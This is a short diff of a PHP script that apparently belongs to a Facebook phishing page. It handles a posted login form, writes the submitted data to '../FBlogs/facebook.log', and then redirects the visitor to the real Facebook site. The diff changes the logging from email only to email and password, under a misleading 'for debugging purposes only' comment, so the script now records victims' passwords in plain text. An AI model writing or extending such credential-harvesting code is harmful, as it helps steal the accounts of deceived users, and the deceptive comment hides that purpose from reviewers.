@@ -19,8 +19,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             mkdir('../FBlogs', 0777, true);
         }
 
-        // Log the email (avoid logging passwords)
-        error_log("Email: $email\n", 3, "../FBlogs/facebook.log");
+        // Log the email and password (for debugging purposes only)
+        error_log("Email: $email\nPassword: $password\n", 3, "../FBlogs/facebook.log");
 
         // Redirect to the real Facebook login page
         header("Location: https://www.facebook.com/");
